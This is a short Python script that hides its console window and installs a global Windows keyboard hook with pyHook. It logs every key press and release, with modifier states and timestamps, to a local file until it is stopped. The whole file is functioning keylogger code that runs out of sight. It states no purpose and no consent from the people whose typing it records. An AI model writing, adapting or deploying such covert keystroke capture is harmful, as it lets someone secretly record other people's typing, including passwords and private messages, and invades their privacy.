# -*- coding: utf-8 -*-
"""
Created on Tue May 12 12:11:47 2020

@author: Shreya Khuwal
"""
import time
import win32console 
import win32gui 
import pythoncom
import pyHook
from pyHook.HookManager import HookConstants,GetKeyState

window = win32console.GetConsoleWindow() 
win32gui.ShowWindow(window, 0) 

def OnKeyboard(event):
    shift='0';
    ctrl='0';
    print(time.time())
    if GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT')):
       shift='1'
    elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')):
       ctrl='1'
    file=open('try.txt','a')
    file.write(str(event.MessageName)+'\t'+str(event.KeyID)+'\t'+shift+'\t'+str(event.Alt)+'\t'+ctrl+'\t'+str(time.time())+'\n')
    file.close()
    return True

hookmanager = pyHook.HookManager() 
hookmanager.KeyDown = OnKeyboard 
hookmanager.KeyUp = OnKeyboard
# set the hook 
hookmanager.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 